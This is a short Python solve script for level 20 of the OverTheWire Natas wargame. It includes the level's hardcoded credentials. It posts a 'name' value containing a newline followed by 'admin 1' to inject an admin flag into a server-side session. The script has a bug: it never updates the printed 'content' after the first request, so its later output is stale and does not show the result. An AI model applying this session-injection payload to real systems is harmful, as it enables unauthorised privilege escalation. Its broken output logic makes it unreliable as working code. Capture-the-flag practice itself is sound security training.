#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright 2020 leaundre leaundre.jackson87@gmail.com
#


"""
Natas 20 Solution
"""

import requests


username = 'natas20'
password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'

url = 'http://%s.natas.labs.overthewire.org/?debug=true' % username

session = requests.Session()

response = session.get(url, auth=(username, password))
content = response.text
print(content)
print("="*80)

response = session.post(
    url, data={"name": "plzsub\nadmin 1"}, auth=(username, password))
print(content)
print("="*80)

response = session.get(url, auth=(username, password))
print(content)
print("="*80)
